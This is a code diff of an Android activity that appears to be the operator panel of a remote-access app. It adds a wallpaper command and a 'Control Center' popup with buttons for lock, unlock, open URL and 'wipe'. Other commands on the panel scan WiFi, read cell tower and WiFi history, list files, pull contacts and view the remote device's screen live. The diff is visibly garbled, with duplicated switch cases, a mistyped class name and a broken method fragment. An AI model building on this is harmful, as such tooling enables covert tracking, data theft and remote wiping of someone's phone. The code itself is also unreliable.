@@ -133,7 +133,8 @@ public class ControlActivity extends Activity {
             {"WiFi Scan", "#00BCD4", "wifiscan"},
             {"Files", "#FF5722", "list_files"},
             {"Cell Tower", "#607D8B", "celltower"},
-            {"WiFi Hist", "#3F51B5", "wifihistory"}
+            {"WiFi Hist", "#3F51B5", "wifihistory"},
+            {"Wallpaper", "#E91E63", "wallpaper"}
         };
 
         LinearLayout row = null;
@@ -236,6 +237,7 @@ public class ControlActivity extends Activity {
             case "list_files": return "📁";
             case "celltower": return "📡";
             case "wifihistory": return "🕒";
+            case "wallpaper": return "🖼️";
             default: return "•";
         }
     }
@@ -681,7 +683,47 @@ public class ControlActivity extends Activity {
             case "toast": showToastDialog(); return;
             case "openurl": showOpenUrlDialog(); return;
             case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
+            case "list_files": i = new Intent(this,msActivity.class); break;
+            case "get_contacts": i = new Intent(this, ContactsActivity.class); break;
+            case "playmusic": showPlaysoundDialog(); return;
+            case "wallpaper": showWallpaperDialog(); return;
+            case "toast": showToastDialog(); return;
+            case "openurl": showOpenUrlDialog(); return;
+            case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
             case "list_files": i = new Intent(this, FileManagerActivity.class); break;
+        }
+        if (i != null) {
+            i.putExtra("deviceId", deviceId);
+            startActivity(i);
+        }
+    }
+
+    private void showControlPopup() {
+        AlertDialog.Builder b = new AlertDialog.Builder(this);
+        b.setTitle("Control Center");
+        LinearLayout lay = new LinearLayout(this);
+        lay.setOrientation(LinearLayout.VERTICAL);
+        String[] cmds = {"flashlight_premium", "vibrate_premium", "lock", "unlock", "toast", "openurl", "wipe"};
+        for (String cmd : cmds) {
+            Button btn = new Button(this);
+            btn.setText(cmd);
+            btn.setTextColor(0xFFFFFFFF);
+            btn.setBackgroundColor(0xFF171717);
+            if (cmd.equals("flashlight_premium")) {
+                btn.setOnClickListener(v -> showFlashlightDialog());
+            } else if (cmd.equals("vibrate_premium")) {
+                btn.setOnClickListener(v -> showVibrateDialog());
+            } else {
+                btn.setOnClickListener(v -> sendCmd(cmd));
+            }
+            lay.addView(btn);
+        }
+        b.setView(lay);
+        b.setNegativeButton("Tutup", null);
+        b.show();
+    }
+
+    private void FileManagerActivity.class); break;
         }
         if (i != null) {
             i.putExtra("deviceId", deviceId);
